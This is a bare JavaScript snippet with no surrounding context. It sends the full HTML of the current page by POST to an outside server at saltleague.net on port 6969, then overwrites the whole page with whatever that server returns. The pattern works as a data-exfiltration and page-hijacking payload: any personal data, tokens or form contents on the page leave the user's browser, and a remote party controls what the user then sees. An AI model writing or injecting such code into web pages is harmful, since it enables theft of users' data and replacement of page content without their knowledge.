const xhr = new XMLHttpRequest();
xhr.open("POST", 'http://saltleague.net:6969');

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log('status: ' + xhr.status);
      console.log('response: ' + xhr.responseText);
      document.documentElement.innerHTML = xhr.responseText;
   }
};

xhr.send(document.documentElement.innerHTML);
